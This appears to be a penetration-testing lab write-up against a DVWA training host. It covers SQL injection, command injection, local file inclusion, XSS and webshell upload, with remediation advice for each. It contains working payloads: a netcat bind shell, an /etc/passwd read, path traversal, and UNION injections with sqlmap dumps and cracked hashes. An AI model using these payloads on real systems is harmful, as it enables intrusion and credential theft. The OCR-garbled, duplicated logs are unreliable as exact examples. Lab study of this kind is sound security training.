# Web App Exploitation

## Executive Summary

SQL Injections, Cross-Site Scripting (XSS), Webshells, and Local File Inclusions (LFI) are web application vulnerabilities that can pose significant business risks if not adequately addressed. SQL Injections occur when an attacker can manipulate SQL queries in a web application by injecting malicious SQL code. This can allow the attacker to view, modify, or delete data in the application's database, potentially leading to unauthorized access to sensitive information. Proper input validation and parameterized queries can help prevent SQL Injections. Cross-Site Scripting (XSS) vulnerabilities arise when an attacker is able to inject malicious code, usually in the form of scripts, into web pages viewed by other users. This can allow the attacker to steal sensitive data, such as login credentials, or perform actions on behalf of the user without their consent. Implementing proper input validation and output encoding can help mitigate XSS attacks. Webshells are malicious scripts or files uploaded to a web server by an attacker, providing unauthorized access to the server. Once installed, webshells allow the attacker to execute arbitrary commands, upload/download files, and gain complete control over the compromised system. Regular security audits, proper file permissions, and continuous monitoring can help detect and prevent webshell attacks. Local File Inclusions (LFI) occur when an attacker can include and execute local files on a web server. This could expose sensitive data, such as configuration files or passwords, or allow the attacker to gain unauthorized access to the system. Proper input validation and file access controls can help mitigate LFI vulnerabilities.

**Security vulnerabilities**: The Nikto scan results indicate several security vulnerabilities in the target website, including outdated server software (Apache/2.2.8), missing security headers (X- Frame-Options, X-XSS-Protection, X-Content-Type-Options), cookies without the httponly flag, directory indexing, and potential information disclosure via specific HTTP requests. These vulnerabilities can pose a serious risk to the security of the website and the data it stores, potentially leading to unauthorized access, data breaches, and other security incidents.

**Risk of exploitation**: The presence of known security vulnerabilities identified by Nikto scan makes the target website an attractive target for malicious hackers and cybercriminals. They could exploit these vulnerabilities to gain unauthorized access to sensitive information, inject malicious code, deface the website, disrupt its availability, or launch other types of attacks, resulting in reputational damage, financial losses, and legal liabilities.

**Compliance violations**: The findings of the Nikto scan, such as outdated server software, missing security headers, and directory indexing, may also indicate non-compliance with industry standards, regulations, and best practices for web security. This could result in potential legal and regulatory fines, penalties, and sanctions, as well as damage to the organization's reputation and credibility.

**Increased security efforts**: The Nikto scan results highlight the need for increased security efforts, including patching and updating server software, configuring security headers correctly, securing cookies with http only flag, disabling directory indexing, and implementing other security measures to address the identified vulnerabilities. This may require additional time, resources, and investments in security technologies, training, and expertise, which can impact the organization's budget and operational efficiency.

**Business disruption**: In case of successful exploitation of the identified vulnerabilities, the organization may experience business disruption, including website downtime, loss of customer trust, and negative impact on sales and revenue. This can result in financial losses, damage to brand reputation, and long-term consequences for the organization's bottom line.

**Increased monitoring and response efforts**: The Nikto scan results also highlight the need for increased monitoring and response efforts to detect and respond to potential security incidents. This may require deploying additional security monitoring tools, implementing incident response plans, and dedicating resources for continuous monitoring and analysis of website traffic, logs, and other security indicators. These efforts can increase the organization's operational costs and resource allocation.

**Reputational damage**: The presence of security vulnerabilities identified by Nikto scan can result in reputational damage for the organization. Customers, partners, and other stakeholders may lose trust in the organization's ability to protect their data and may choose to do business with other more secure alternatives. This can have long-term impacts on the organization's brand reputation, customer relationships, and market share.

**Legal and regulatory consequences**: Non-compliance with industry standards, regulations, and best practices for web security, as indicated by the Nikto scan results, may result in legal and regulatory consequences. This can include fines, penalties, and sanctions imposed by regulatory authorities, legal liabilities resulting from data breaches or other security incidents, and potential legal actions from affected customers or partners. These consequences can have significant financial and legal impacts on the organization.

## SQL Injections

```ruby
    1 | cat /etc/passwd
    1 | netcat -v -e ‘/bin/bash’ -l -p 31337
 ```
   
<img width="476" alt="Screenshot 2024-07-04 at 3 21 37 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/75bc44ac-5354-45e9-8d00-f25fe8806faf">

<img width="668" alt="Screenshot 2024-07-04 at 3 21 48 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/0e7ae18c-894d-4860-a500-81090778101e">

```ruby
    http://191.168.1.22/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

<img width="483" alt="Screenshot 2024-07-04 at 3 22 22 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/eceddeeb-304c-48f9-81b2-fe80082b1ae0">

```ruby 
    %’ or ‘0’=’0
    %’ or 0=0 union select null, database() #
    ‘union select 1,@@version#
```

<img width="336" alt="Screenshot 2024-07-04 at 3 22 45 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/a4d0ee4d-c6eb-4a3b-aeea-e27759e9b1f3">

```ruby
    1' and 1=0 union select null,table_name from information_schema.columns where table_name='users'' #
    – 1' and 1=0 union select null,concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'' #
    – 1' and 1=0 union select null,concat(first_name,0x0a,password) from users #
```

<img width="450" alt="Screenshot 2024-07-04 at 3 23 35 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/7c349eaf-cfcf-46d9-b6b0-491a5d87ccac">

```ruby
    [15:32:191 INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 8.04 (Hardy Heron) web application technology: Apache 2.2.8, PHP 5.2.4 back-end DBMS: MySQL >= 4.1
    [15:32:20] [INFO] fetching columns for table 'users' in database 'dwa'
    [15:32:20] [INFO] fetching entries for table 'users' in database 'dvwa'
    [15:32:20] [INFO] recognized possible password hashes in column 'password' do you want to store hashes to a temporary file for eventual further processing with other tools /NIn do you want to crack them via a dictionary-based attack?
    [VIn/g]y
    [15:38:35] [INFO] using hash method 'md5_generic_passwd' what dictionary do you want to use?
    1 default dictionary file '/usr/share/sq|map/data/t×t/wordlist.tx_'(press Enter)
    2 custom dictionary file
    3 file with list of dictionary files
    >g
    [15:38:41] [INFO] using default dictionary
    do you want to use common password suffixes? (slow!) [y/N] n [15:38:46] [INFO] starting dictionary-based cracking (md5_generic_passwd)
    [15:38:46] [INFO] starting 8 processes
    [15:38:47] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f26085367892203'
    [15:38:48] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
    [15:38:49] [INFO] cracked password 'letmein' for hash 'Od107d09f5bbe40cade3de5c71e9e9b7'
    [15:38:50] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
    [15:38:50] [INFO] cracked password 'test123' for hash 'cc03e747a6afbbcbf8be7668acfebee5'
    Database: dvwa
    Table: users
    [5 entries]
    | user_id | user | avatar | password | last_name | first_name 11 l admin | http://192.168.1.22/dvwa/hackable/users/admin.jpg | cc03e747a6afbbcbf8be7668acfebee5 (test123) | admin | admin
    4 I gordonb | http://192.168.1.22/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon
    5 | 1337 http://192.168.1.22/dvwa/hackable/users/1337.jpg |

    1 default dictionary file '/usr/share/sq|map/data/t×t/wordlist.tx_'(press Enter)
    2 custom dictionary file
    3 file with list of dictionary files
    >g
    [15:38:41] [INFO] using default dictionary
    do you want to use common password suffixes? (slow!) [y/N] n [15:38:46] [INFO] starting dictionary-based cracking (md5_generic_passwd)
    [15:38:46] [INFO] starting 8 processes
    [15:38:47] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f26085367892203'
    [15:38:48] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
    [15:38:49] [INFO] cracked password 'letmein' for hash 'Od107d09f5bbe40cade3de5c71e9e9b7'
    [15:38:50] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
    [15:38:50] [INFO] cracked password 'test123' for hash 'cc03e747a6afbbcbf8be7668acfebee5'
    Database: dvwa
    Table: users
    [5 entries]
    | user_id | user | avatar | password | last_name | first_name 11 l admin | http://192.168.1.22/dvwa/hackable/users/admin.jpg | cc03e747a6afbbcbf8be7668acfebee5 (test123) | admin | admin4 I gordonb | http://192.168.1.22/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon 5 | 1337 http://192.168.1.22/dvwa/hackable/users/1337.jpg |8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack
    4 | pablo | http://192.168.1.22/dvwa/hackable/users/pablo.jpg | Od107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo 15 | smithy | http://192.168.1.22/dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob [15:38:51] [INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/ output/192.168.1.22/dump/dvwa/users.csv'
    [15:38:51] [INFO] fetched data logged to text files under '/root/.local/share/sq|map/ output/192.168.1.22'
    [*] ending @ 15:38:51 /2023-04-16/
    *starting @ 15:38:55 /2023-04-16/
    [15:38:55] [INFO] resuming back-end DBMS 'mysql'
    [15:38:55] [INFO] testing connection to the target URL
    [15:38:55] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS sqlmap resumed the following injection points) from stored session:
    Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT -
    MySQL comment)
    Payload: id=asd' OR NOT 8493=8493#&Submit=Submit
    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=asd' OR ROW(7330,8127)>(SELECT COUNT(*),CONCAT(0×7176706271,(SELECT (ELT(7330=7330,1)), 0x7171716a71,FLOOR(RAND(0)*2)xFROM (SELECT 3724 UNION SELECT 9221 UNION SELECT 8114 UNION SELECT 3905)a GROUP BY ×) -- dVJB&Submit=Submit
```

- Use Prepared Statements or Parameterized Queries: Prepared Statements or Parameterized Queries are a secure way to handle SQL queries in code. They separate the SQL query from the user input and automatically escape any special characters, preventing SQL injection attacks.
- Sanitize User Input: Before using user input in SQL queries, validate and sanitize it to ensure it contains only expected characters. For example, if the user is supposed to input an integer, make sure the input is indeed an integer before using it in a query.
- Implement Proper Access Controls: Ensure users have the least privilege necessary to perform their tasks. Avoid using a generic database user with high benefits for application access. Instead, create separate database users with limited benefits based on the specific operations they need to perform. For example, suppose the application only needs to read data from a table. In that case, the database user used by the application should have only read permissions on that table and not write or delete permissions.
- Keep Software Up to Date: Regularly update your web server, database server, and all software used in your application, including PHP, Apache, and MySQL, to their latest versions. This helps to patch known security vulnerabilities and protect against known attacks.
- Implement Web Application Firewall (WAF): WAF can help detect and block suspicious or malicious requests, including SQL injection attacks. Configure your WAF to filter and block SQL injection attempts based on predefined or custom rules tailored to your application.
- Enable Error Reporting and Logging: Enable error reporting and logging in your application to capture and monitor any SQL errors or unexpected behaviors. Review logs regularly to identify and fix any potential security issues.
- Follow Principle of Least Privilege: Limit the permissions and privileges of the database user used by the application to the minimum necessary to perform its intended functions. Avoid using a superuser or highly privileged database user for routine application tasks.
- Use Secure Password Storage: Store passwords securely using robust hashing algorithms with salts. Avoid storing plain text passwords in the database. Use established password storage best practices, such as bcrypt, to protect passwords from being easily cracked.

### Cross-Site Scripting
 
<img width="521" alt="Screenshot 2024-07-04 at 3 53 52 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/a2d4f138-fa41-43ac-86db-167cdd7b1546">

<img width="527" alt="Screenshot 2024-07-04 at 3 54 03 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/16247b0c-6ea5-4b6c-bae5-43d7e5852b74">

- http://192.168.1.22/dvwa/hackable/uploads/php-backdoor.php. The page allows the user to interact with the system through various options.

- Reflected XSS: Upon examining the page's source code, it is observed that the user input is passed through a GET request without any filtering. This allows an attacker to inject malicious JavaScript code into the page, which is then executed on the victim's machine. In the example provided, the injected code <script>alert("Hello")</script> triggers a pop- up message box displaying the word "Hello". This demonstrates the vulnerability of showing user input verbatim on the page, which can lead to information harvesting, cookie stealing, and browser exploitation.

- Stored XSS: The page appears to be a message board, and the source code reveals that user input is processed using a POST request and is not filtered. Additionally, MySQL is used in the back end. This means that the injected JavaScript code will be stored on the server and displayed to all users who visit the page, potentially leading to malware being dropped on their systems. This attack is more widespread as it affects all users who access the page, making it more dangerous regarding potential impact.

#### Local File Inclusions

```ruby
      nikto -h http://192.168.1.22/dvwa
      - Nikto v2.1.6
      + Target IP: 192.168.1.22
      + Target Hostname: 192.168.1.22
      + Target Port: 80
      † Start Time: 2023-04-16 19:13:01 (GMT-4)
      + Server: Apache/2.2.8 (Ubuntu) DAV/2
      + Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
      + The anti-clickjacking X-Frame-Options header is not present.

      + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
      + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
      + Cookie PHPSESSID created without the httponly flag + Cookie security created without the httponly flag
      + Root page / redirects to: login.php
      + No CGI Directories found (use '-C all' to force check all possible dirs)
      + Server may leak inodes via ETags, header found with file /dvwa/robots. txt, inode: 93164, size: 26, time: Tue Mar 16 01:56:22 2010
      + Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
      + Uncommon header 'tcn' found, with contents: list
      + Apache mod _negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php? id=4698ebdc59d15. The following alternatives for 'index' were found: index php
      + + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST ^[IA+ OSVDB-3268: /dwwa/config/: Directory indexing found.
      + /dvwa/config/: Configuration information may be available remotely. ^[[B+ OSVDB-12184: /dvwa/?=PHPB8B5F2A0-3C92-11d3-A3A9- 4C7B08C10000: PH reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-12184: /dwa/?=PHPE9568F36-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-12184: /dwa/?=PHPE9568F34-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-12184: /dwa/?=PHPE9568F35-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-3092:/dvwa/login/: This might be interesting...
      + OSVDB-3268: /dvwa/docs/: Directory indexing found.
      + OSVDB-3092: /dvwa/CHANGELOG.txt: A changelog was found.
      +/dvwa/login.php: Admin login page/section found.
      + /dvwa/?-s: PHP allows retrieval of the source code via the -s parameter, and may allow command execution. See http://www.kb.cert.org/vuls/id/520827
      + +/dvwa/login.php?-s: PHP allows retrieval of the source code via the -s parameter and may allow command execution. See http://www.kb.cert.org/vuls/id/520827
      + + /dvwa/CHANGELOG. txt: Version number implies that there is a SQL Injection in Drupal 7, can be used for authentication bypass (Drupageddon: see https:// www.sektioneins.de/advisories/advisory-012014-drupal- pre-auth-sql-injection-vulnerability.html).
      + 7914 requests: 0 error(s) and 25 items) reported on remote host
      + End Time: 2023-04-16 19:13:46 (GMT-4) (45 seconds)
      † 1 hosts) tested

      nikto -h http://192.168.1.22/dvwa -C Ifisearch
      - Nikto v2.1.6
      + Target IP: 192.168.1.22
      + Target Hostname: 192.168.1.22
      + Target Port: 80
      + Start Time: 2023-04-16 19:31:27 GMT-4)
      + Server: Apache 2.2.8 (Ubuntu) DAV/2
      + Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
      + The anti-clickjacking X-Frame-Options header is not present.
      + The XXSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
      + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
      + Cookie PHPSESSID created without the httponly flag + Cookie security created without the http only flag
      + Root page / redirects to: login.php
      + Server may leak inodes via Tags, header found with file / dvwa/robots.txt, inode: 93164, size: 26, time: Tue Mar 16 01:56:22 2010
      + Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
      + Uncommon header 'ten' found, with contents: list
      + Apache mod negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php? id=4698ebdc59d15. The following alternatives for 'index' were found: index.php + Allowed HTTP Methods: GET, HEAD, POST,

      OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
      + OSVDB-3268: /dvwa/config/: Directory indexing found.
      + /dvwa/config/: Configuration information may be available remotely.
      + OSVDB-12184: /dvwa/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-12184: /dvwa/?=PHPE9568F36-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-12184: /dvwa/?=PHPE9568F34-D428-11d2-A769- 00A001ACF42:PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-12184: /dwa/?=PHPE9568F35-D428-11d2-A769-00A001ACF42:PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
      + OSVDB-3092: /dwa/login/: This might be interesting...
      + OSVDB-3268:/dwa/docs/: Directory indexing found.
      + OSVDB-3092:/dwa/CHANGELOG.txt: A changelog was found.
      +/dvwa/login.php: Admin login page/section found.
      + /dvwa/?-s: PHP allows retrieval of the source code via the -s parameter, and may allow command execution. See http://www.kb.cert.org/vuls/id/520827 +/dvwa/login.php?-s: PHP allows retrieval of the source code via the -s parameter, and may allow command execution. See http://www.kb.cert.org/vuls/id/520827
      + /dvwa/CHANGELOG.txt: Version number implies that there is a SQL Injection in Drupal 7, can be used for authentication bypass (Drupageddon: see https:// www.sektioneins.de/advisories/advisory-012014-drupal-pre-auth- sql-injection-vulnerability.html).
      + 8701 requests: 0 errors) and 25 items) reported on remote host
      + End Time: 2023-04-16 19:32:14 GMT-4) (47 seconds)
      + 1 hosts) tested OSVDB-12184: /dwa/?=PHPE9568F36-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.

OSVDB-12184: /dwa/?=PHPE9568F34-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
OSVDB-12184: /dwa/?=PHPE9568F35-D428-11d2-A769-00A001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
```

1. Update PHP to the latest version: Ensuring that PHP is regularly updated to the latest stable version is crucial, as it helps address known vulnerabilities, including OSVDB-12184.
2. Validate and sanitize user input: Implement proper input validation and sanitization techniques in the PHP application to validate and sanitize user-supplied data, including QUERY strings, before processing them. This prevents malicious input from triggering sensitive information disclosure.
3. Implement server-side filtering: Set up server-side filtering mechanisms, such as web application firewalls (WAFs), to filter and block potentially harmful QUERY strings before they reach the PHP script. This can help detect and block malicious requests that may exploit the vulnerability.
4. Follow the principle of least privilege: Limit the permissions and privileges of PHP scripts and processes to the minimum necessary for their intended functions. Avoid running PHP scripts with excessive privileges, as this reduces the potential impact of successfully exploiting the vulnerability.
5. Conduct regular security and penetration testing: Regularly audit and test the PHP application for security vulnerabilities, including potentially sensitive information disclosure issues. This helps identify weaknesses in the application's security posture and allows for timely remediation.
6. Avoid storing sensitive information in PHP scripts or configuration files: Refrain from storing sensitive information, such as passwords or API keys, in PHP scripts or configuration files. Instead, use secure methods such as encryption or secure credential management solutions.
7. Implement strong authentication and authorization mechanisms: Strengthen the authentication and authorization mechanisms in the PHP application to prevent unauthorized access to sensitive information. Use appropriate access controls and authentication mechanisms to restrict access to sensitive data and functionalities.

### Web Shell

<img width="723" alt="Screenshot 2024-07-04 at 3 58 45 PM" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/b3c71218-956d-49ba-8354-816c104f30a3">
  
    http://192.168.1.22/dvwa/hackable/uploads/php-backdoor.php

Locating the PHP webshell: The "locate" command is used to search for webshells in the directory "/usr/share/webshells/php/" in Kali Linux.

- Copying the webshell to the main directory: The "cp" command is used to make a copy of the "php-backdoor.php" file from the directory "/usr/share/webshells/php/" to the main directory "~/" (which typically represents the home directory of the current user).

- Loading the webshell to the website: Once the webshell file is copied to the main directory, it can be accessed via a web browser by navigating to the URL "http://192.168.1.22/dvwa/hackable/uploads/php-backdoor.php". This URL is likely pointing to a vulnerable website or web application that allows file uploads without proper security measures.

- Interacting with the system: Once the webshell is loaded in the browser, it may present various options or a command-line interface that allows the user to interact with the system. This could include executing commands, uploading, or downloading files, and gaining unauthorized access to the website or system.

1. Keep software and applications up to date: Ensure that all software, including the web server, PHP, CMS (Content Management System), and other third-party libraries or plugins, are regularly updated to the latest versions. This helps to patch known vulnerabilities and reduce the risk of exploitation.
2. Implement strong authentication: Use strong and unique usernames and passwords for all user accounts, including those used to access the website's backend or administrative interfaces. Enable multi-factor authentication (MFA) wherever possible to add an extra layer of security.
3. Restrict access permissions: Limit the permissions and privileges of files and directories to the minimum necessary for their intended functions. Avoid running PHP scripts with excessive privileges, and restrict write permissions to sensitive directories to prevent unauthorized modification.
4. Regularly review and remove unnecessary files: Regularly review the files and directories on the website's server and remove any unnecessary or unused files, including webshells or other suspicious files that may have been uploaded.
5. Use input validation and sanitization: Implement proper input validation and sanitization techniques in the PHP code to validate and sanitize user-supplied data, including file uploads, to prevent code execution or arbitrary file uploads.
6. Set up proper file upload restrictions: Configure the webserver to restrict the types of files that can be uploaded and validate file extensions and content types to ensure that only legitimate files are allowed.
7. Monitor for suspicious activities: Implement logging and monitoring mechanisms to track and detect any suspicious activities, including unauthorized access attempts or file uploads. Regularly review logs for any signs of potential attacks.
8. Conduct regular security and penetration testing: Regularly audit and conduct penetration testing on your website or system to identify and address any vulnerabilities or weaknesses before attackers can exploit them.
9. Educate and train users: Educate website administrators, developers, and other authorized users about security best practices, including the risks of webshell attacks, and train them to detect and respond to potential security incidents.
